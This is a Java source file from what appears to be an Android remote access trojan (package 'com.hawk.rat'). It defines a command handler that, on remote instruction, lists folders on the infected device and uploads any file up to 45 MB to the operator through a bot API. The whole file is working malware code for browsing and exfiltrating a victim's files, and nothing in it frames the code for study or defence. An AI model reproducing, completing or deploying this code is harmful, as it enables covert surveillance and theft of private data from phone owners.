package com.hawk.rat;
import android.content.Context;
import java.io.File;
import java.util.Arrays;
public class CmdFiles {
    private final Context ctx;
    public CmdFiles(Context c) { this.ctx = c; }
    public void list(String p) {
        new Thread(() -> {
            try {
                File d = new File(p);
                if (!d.exists()) { BotApi.sendMessage(ctx, "Not found"); return; }
                File[] items = d.listFiles();
                if (items == null) { BotApi.sendMessage(ctx, "Empty"); return; }
                Arrays.sort(items, (a,b) -> a.getName().compareToIgnoreCase(b.getName()));
                StringBuilder s = new StringBuilder("📁 "+p+"\n");
                int c=0; for (File f:items) { if(c++>50) { s.append("...\n"); break; } s.append(f.isDirectory()?"[D] ":"[F] ").append(f.getName()).append("\n"); }
                BotApi.sendMessage(ctx, s.toString());
            } catch (Exception e) { BotApi.sendMessage(ctx, "err: "+e.getMessage()); }
        }).start();
    }
    public void download(String p) {
        new Thread(() -> {
            try {
                File f = new File(p);
                if (!f.exists() || f.length() > 45*1024*1024) { BotApi.sendMessage(ctx, "Invalid or >45MB"); return; }
                BotApi.sendFile(ctx, f, "📄 "+f.getName());
            } catch (Exception e) { BotApi.sendMessage(ctx, "err: "+e.getMessage()); }
        }).start();
    }
}
